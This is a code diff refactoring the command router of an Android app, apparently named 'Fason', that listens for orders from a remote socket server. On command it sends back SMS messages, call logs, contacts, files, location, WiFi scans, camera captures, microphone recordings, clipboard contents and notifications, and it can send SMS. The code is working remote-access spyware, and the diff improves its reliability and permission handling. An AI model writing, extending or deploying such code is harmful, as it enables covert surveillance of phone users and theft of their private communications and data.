@@ -1,12 +1,11 @@
 package com.fason.app.core.network;
 
 import android.Manifest;
-import android.content.pm.ServiceInfo;
-import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 
 import com.fason.app.core.FasonApp;
+import com.fason.app.core.Protocol;
 import com.fason.app.core.permissions.PermissionManager;
 import com.fason.app.features.apps.AppList;
 import com.fason.app.features.apps.FasonManager;
@@ -15,12 +14,12 @@ import com.fason.app.features.camera.CameraManager;
 import com.fason.app.features.clipboard.ClipboardMonitor;
 import com.fason.app.features.contacts.ContactsManager;
 import com.fason.app.features.info.InfoManager;
-import com.fason.app.features.location.LocManager;
+import com.fason.app.features.location.GpsManager;
 import com.fason.app.features.mic.MicManager;
 import com.fason.app.features.sms.SMSManager;
 import com.fason.app.features.storage.FileManager;
 import com.fason.app.features.wifi.WifiScanner;
-import com.fason.app.notifications.NotificationRelayService;
+import com.fason.app.features.notification.NotificationRelayService;
 import com.fason.app.service.MainService;
 
 import org.json.JSONArray;
@@ -31,7 +30,6 @@ import java.util.concurrent.Executors;
 
 import io.socket.client.Socket;
 
-// Routes socket commands to feature handlers
 public final class SocketCommandRouter {
 
     private static FileManager fileMgr;
@@ -39,14 +37,13 @@ public final class SocketCommandRouter {
     private static final ExecutorService EXEC = Executors.newFixedThreadPool(4);
     private static final Handler handler = new Handler(Looper.getMainLooper());
     private static boolean initialized = false;
+    private static volatile boolean settingsPrompted = false;
 
     private SocketCommandRouter() {}
 
-    // Initialize command router
     public static synchronized void initialize() {
         if (initialized) return;
 
-        // Lazy init managers
         if (fileMgr == null) fileMgr = new FileManager();
         if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());
 
@@ -56,234 +53,280 @@ public final class SocketCommandRouter {
             return;
         }
 
-        socket.off();
+        // Only remove our own listeners, not SocketClient's internal ones
+        socket.off(Protocol.EVT_PING);
+        socket.off(Protocol.EVT_ORDER);
 
-        // Keep-alive ping
-        socket.on("ping", args -> {
+        socket.on(Protocol.EVT_PING, args -> {
             Socket s = SocketClient.getInstance().getSocket();
-            if (s != null) s.emit("pong");
+            if (s != null) s.emit(Protocol.EVT_PONG);
         });
 
-        // Main command handler
-        socket.on("order", args -> handleOrder(args));
-
-        // Reconnect on disconnect
-        socket.on(Socket.EVENT_DISCONNECT, args -> {
-            handler.postDelayed(() -> {
-                Socket s = SocketClient.getInstance().getSocket();
-                if (s != null && !s.connected()) s.connect();
-            }, 5000);
-        });
+        socket.on(Protocol.EVT_ORDER, args -> handleOrder(args));
 
         socket.connect();
         initialized = true;
     }
 
-    // Route command to handler
     private static void handleOrder(Object[] args) {
         try {
             if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
             JSONObject data = (JSONObject) args[0];
-            String type = data.optString("type", "");
+            String type = data.optString(Protocol.KEY_TYPE, "");
             Socket socket = SocketClient.getInstance().getSocket();
 
             switch (type) {
-                case "0xFI": handleFile(data); break;
-                case "0xSM": handleSms(data, socket); break;
-                case "0xCL": EXEC.execute(() -> emit(socket, "0xCL", CallsManager.getLogs())); break;
-                case "0xCO": EXEC.execute(() -> emit(socket, "0xCO", ContactsManager.getContacts())); break;
-                case "0xMI": handleMic(data); break;
-                case "0xLO": handleLocation(socket); break;
-                case "0xWI": handleWifi(socket); break;
-                case "0xPM": EXEC.execute(() -> emit(socket, "0xPM", PermissionManager.getGranted())); break;
-                case "0xIN": EXEC.execute(() -> emit(socket, "0xIN", AppList.get(data.optBoolean("sys", true)))); break;
-                case "0xGP": checkPerm(socket, data.optString("perm", "")); break;
-                case "0xCA": handleCamera(data, socket); break;
-                case "0xCB": handleClipboard(data); break;
-                case "0xNO": handleNotif(data, socket); break;
-                case "0xFM": handleFason(data, socket); break;
-                case "0xIF": EXEC.execute(() -> emit(socket, "0xIF", InfoManager.get())); break;
+                case Protocol.FILES:       EXEC.execute(() -> handleFile(data)); break;
+                case Protocol.SMS:         handleSms(data, socket); break;
+                case Protocol.CALLS:       EXEC.execute(() -> emit(socket, Protocol.CALLS, CallsManager.getLogs())); break;
+                case Protocol.CONTACTS:    EXEC.execute(() -> emit(socket, Protocol.CONTACTS, ContactsManager.getContacts())); break;
+                case Protocol.MIC:         handleMic(data, socket); break;
+                case Protocol.LOCATION:    handleLocation(socket); break;
+                case Protocol.WIFI:        handleWifi(socket); break;
+                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted())); break;
+                case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)))); break;
+                case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, "")); break;
+                case Protocol.CAMERA:      handleCamera(data, socket); break;
+                case Protocol.CLIPBOARD:   handleClipboard(data); break;
+                case Protocol.NOTIF:       handleNotif(data, socket); break;
+                case Protocol.FASON:       handleFason(data, socket); break;
+                case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get())); break;
             }
         } catch (Exception ignored) {}
     }
 
-    // File operations
     private static void handleFile(JSONObject data) {
-        String action = data.optString("action");
-        String path = data.optString("path", "");
+        String action = data.optString(Protocol.KEY_ACTION);
+        String path = data.optString(Protocol.KEY_PATH, "");
         try {
-            if ("ls".equals(action)) {
+            if (Protocol.ACT_LS.equals(action)) {
+                JSONArray list = fileMgr.walk(path);
+                String actualPath = path;
+                if (actualPath == null || actualPath.isEmpty()) {
+                    actualPath = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
+                }
                 JSONObject r = new JSONObject();
-                r.put("type", "list");
-                r.put("list", fileMgr.walk(path));
-                r.put("path", path);
-                SocketClient.getInstance().getSocket().emit("0xFI", r);
-            } else if ("dl".equals(action)) {
+                r.put(Protocol.KEY_TYPE, Protocol.TYPE_LIST);
+                r.put(Protocol.KEY_LIST, list);
+                r.put(Protocol.KEY_PATH, actualPath);
+                SocketClient.getInstance().getSocket().emit(Protocol.FILES, r);
+            } else if (Protocol.ACT_DL.equals(action)) {
                 fileMgr.downloadFile(path);
             }
         } catch (Exception ignored) {}
     }
 
-    // SMS operations
     private static void handleSms(JSONObject data, Socket socket) {
-        String action = data.optString("action");
-        if ("ls".equals(action)) {
-            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.get()));
-        } else if ("sendSMS".equals(action)) {
-            EXEC.execute(() -> emit(socket, "0xSM", SMSManager.send(
-                data.optString("to"), data.optString("sms"))));
+        String action = data.optString(Protocol.KEY_ACTION);
+        if (Protocol.ACT_LS.equals(action)) {
+            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.get()));
+        } else if (Protocol.ACT_SEND_SMS.equals(action)) {
+            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.send(
+                data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS))));
         }
     }
 
-    // Mic recording
-    private static void handleMic(JSONObject data) {
-        int sec = data.optInt("sec", 0);
-
-        // Update service type for Android 14+
-        MainService svc = MainService.getInstance();
-        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
+    private static void handleMic(JSONObject data, Socket socket) {
+        int sec = data.optInt(Protocol.KEY_SEC, 0);
+        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
+            sendPermError(socket, Protocol.MIC, Manifest.permission.RECORD_AUDIO);
+            return;
         }
-
         MicManager.start(sec);
     }
 
-    // Location
     private static void handleLocation(Socket socket) {
         EXEC.execute(() -> {
+            GpsManager orphanGps = null;
             try {
-                MainService svc = MainService.getInstance();
-                LocManager loc = svc != null ? svc.getLocManager() : new LocManager(FasonApp.getContext());
-
-                loc.requestSingle();
-                Thread.sleep(3000);
-
-                if (loc.canGetLocation()) {
-                    emit(socket, "0xLO", loc.getData());
-                } else {
-                    JSONObject err = new JSONObject();
-                    err.put("enabled", false);
-                    err.put("error", "Location unavailable");
-                    emit(socket, "0xLO", err);
+                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
+                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION);
+                    return;
                 }
-            } catch (Exception ignored) {}
+
+                MainService svc = MainService.getInstance();
+                GpsManager gps = svc != null ? svc.getGpsManager() : null;
+                if (gps == null) {
+                    gps = new GpsManager(FasonApp.getContext());
+                    orphanGps = gps;
+                }
+
+                gps.requestSingle();
+
+                boolean gotLocation = false;
+                for (int i = 0; i < 30; i++) {
+                    Thread.sleep(200);
+                    JSONObject locData = gps.getData();
+                    if (locData.optBoolean(Protocol.KEY_ENABLED, false)) {
+                        emit(socket, Protocol.LOCATION, locData);
+                        gotLocation = true;
+                        break;
+                    }
+                }
+
+                if (!gotLocation) {
+                    JSONObject err = new JSONObject();
+                    err.put(Protocol.KEY_ENABLED, false);
+                    err.put(Protocol.KEY_ERROR, "Location unavailable");
+                    emit(socket, Protocol.LOCATION, err);
+                }
+            } catch (Exception ignored) {} finally {
+                if (orphanGps != null) orphanGps.stop();
+            }
         });
     }
 
-    // WiFi scan - activates location services first (required on Android 6.0+)
+    /** WiFi scan — activates location services first (required on Android 6.0+). */
     private static void handleWifi(Socket socket) {
         EXEC.execute(() -> {
+            GpsManager orphanGps = null;
             try {
-                // Clear WiFi cache to get fresh results
+                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
+                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                    sendPermError(socket, Protocol.WIFI, Manifest.permission.ACCESS_FINE_LOCATION);
+                    return;
+                }
+
                 WifiScanner.clearCache();
-                
-                // Activate location services first (required for WiFi scanning)
+
                 MainService svc = MainService.getInstance();
-                LocManager loc = svc != null ? svc.getLocManager() : new LocManager(FasonApp.getContext());
-                
-                loc.requestSingle();
-                Thread.sleep(3000);
-                
-                // Get fresh socket reference after sleep (socket may have reconnected)
+                GpsManager gps = svc != null ? svc.getGpsManager() : null;
+                if (gps == null) {
+                    gps = new GpsManager(FasonApp.getContext());
+                    orphanGps = gps;
+                }
+
+                gps.requestSingle();
+
+                for (int i = 0; i < 20; i++) {
+                    Thread.sleep(200);
+                    if (gps.canGetLocation()) break;
+                }
+
                 Socket s = SocketClient.getInstance().getSocket();
-                
-                // Perform WiFi scan
                 JSONObject result = WifiScanner.scan(FasonApp.getContext());
                 if (s != null) {
-                    s.emit("0xWI", result);
+                    s.emit(Protocol.WIFI, result);
                 }
             } catch (Exception e) {
                 try {
                     Socket s = SocketClient.getInstance().getSocket();
                     if (s != null) {
                         JSONObject err = new JSONObject();
-                        err.put("error", "WiFi scan failed: " + e.getMessage());
-                        s.emit("0xWI", err);
+                        err.put(Protocol.KEY_ERROR, "WiFi scan failed: " + e.getMessage());
+                        s.emit(Protocol.WIFI, err);
                     }
                 } catch (Exception ignored) {}
+            } finally {
+                if (orphanGps != null) orphanGps.stop();
             }
         });
     }
 
-    // Camera operations
     private static void handleCamera(JSONObject data, Socket socket) {
-        String action = data.optString("action");
-        if ("list".equals(action)) {
+        String action = data.optString(Protocol.KEY_ACTION);
+        if (Protocol.ACT_LIST.equals(action)) {
             JSONObject cams = camMgr.getCameraList();
             if (cams == null) {
                 try {
                     cams = new JSONObject();
-                    cams.put("camList", true);
-                    cams.put("list", new JSONArray());
+                    cams.put(Protocol.KEY_CAM_LIST, true);
+                    cams.put(Protocol.KEY_LIST, new JSONArray());
                 } catch (Exception ignored) {}
             }
-            socket.emit("0xCA", cams);
-        } else if ("capture".equals(action)) {
-            camMgr.capture(data.optInt("id", 0));
+            socket.emit(Protocol.CAMERA, cams);
+        } else if (Protocol.ACT_CAPTURE.equals(action)) {
+            camMgr.capture(data.optInt(Protocol.KEY_ID, 0));
         }
     }
 
-    // Clipboard operations
     private static void handleClipboard(JSONObject data) {
         ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
-        String action = data.optString("action", "fetch");
-        if ("start".equals(action)) {
+        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_FETCH);
+        if (Protocol.ACT_START.equals(action)) {
             m.start();
             EXEC.execute(m::emit);
-        } else if ("stop".equals(action)) {
+        } else if (Protocol.ACT_STOP.equals(action)) {
             m.stop();
         } else {
             EXEC.execute(m::emit);
         }
     }
 
-    // Notification operations
     private static void handleNotif(JSONObject data, Socket socket) {
-        String action = data.optString("action", "status");
-        if ("status".equals(action)) {
+        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
+        if (Protocol.ACT_STATUS.equals(action)) {
             EXEC.execute(() -> {
                 try {
                     JSONObject s = new JSONObject();
-                    s.put("enabled", NotificationRelayService.isEnabled(FasonApp.getContext()));
-                    s.put("connected", NotificationRelayService.getInstance() != null &&
+                    s.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
+                    s.put(Protocol.KEY_CONNECTED, NotificationRelayService.getInstance() != null &&
                         NotificationRelayService.getInstance().isReady());
-                    socket.emit("0xNO", s);
+                    socket.emit(Protocol.NOTIF, s);
                 } catch (Exception ignored) {}
             });
-        } else if ("request".equals(action)) {
+        } else if (Protocol.ACT_REQUEST.equals(action)) {
             NotificationRelayService.requestPermission(FasonApp.getContext());
         }
     }
 
-    // Check permission status
     private static void checkPerm(Socket socket, String perm) {
         EXEC.execute(() -> {
             try {
                 JSONObject r = new JSONObject();
-                r.put("permission", perm);
-                r.put("allowed", PermissionManager.canIUse(perm));
-                socket.emit("0xGP", r);
+                r.put(Protocol.KEY_PERMISSION, perm);
+                r.put(Protocol.KEY_ALLOWED, PermissionManager.canIUse(perm));
+                socket.emit(Protocol.PERM_CHECK, r);
             } catch (Exception ignored) {}
         });
     }
 
-    // Fason manager operations
     private static void handleFason(JSONObject data, Socket socket) {
         EXEC.execute(() -> {
             try {
-                String action = data.optString("action", "status");
-                emit(socket, "0xFM", FasonManager.handle(action));
+                String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
+                emit(socket, Protocol.FASON, FasonManager.handle(action));
             } catch (Exception ignored) {}
         });
     }
 
-    // Emit helper
     private static void emit(Socket socket, String event, Object data) {
         if (socket != null) socket.emit(event, data);
     }
 
-    // Reset router
-    public static void reset() {
+    private static void sendPermError(Socket socket, String event, String perm) {
+        try {
+            JSONObject err = new JSONObject();
+            err.put(Protocol.KEY_ERROR, "Permission restricted");
+            err.put(Protocol.KEY_PERMISSION, perm);
+            err.put(Protocol.KEY_ACTION, Protocol.ACT_OPEN_SETTINGS);
+            emit(socket, event, err);
+        } catch (Exception ignored) {}
+
+        if (!settingsPrompted) {
+            settingsPrompted = true;
+            handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
+        }
+    }
+
+    public static synchronized void shutdown() {
+        if (camMgr != null) {
+            camMgr.shutdown();
+            camMgr = null;
+        }
         initialized = false;
+        settingsPrompted = false;
+    }
+
+    /** Reset router state (keeps managers alive) for re-initialization. */
+    public static synchronized void reset() {
+        Socket socket = SocketClient.getInstance().getSocket();
+        if (socket != null) {
+            socket.off(Protocol.EVT_PING);
+            socket.off(Protocol.EVT_ORDER);
+        }
+        initialized = false;
+        settingsPrompted = false;
     }
 }
